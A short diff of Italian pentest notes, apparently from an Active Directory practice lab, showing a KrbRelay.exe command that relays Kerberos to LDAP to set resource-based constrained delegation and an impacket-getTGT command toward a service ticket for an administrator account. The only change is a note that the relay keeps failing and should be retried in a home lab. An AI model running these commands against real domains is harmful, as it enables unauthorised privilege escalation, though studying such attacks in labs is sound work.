@@ -470,7 +470,7 @@ Lanciamo KrbRelay.exe
 .\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 9acf41ed-d457-4cc1-941b-ab02c26e4686 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
 ```
 ![[Pasted image 20230906150422.png]]
-==Continua a dare errore, potrebbe essere colpa di azure, da riprovare con i==
+==Continua a dare errore, potrebbe essere colpa di azure, da riprovare con il lab a casa==
 Ora usiamo Impacket per ottenere un TGT e poi un ST per l'account da amministratore
 ```bash
 impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPassword'
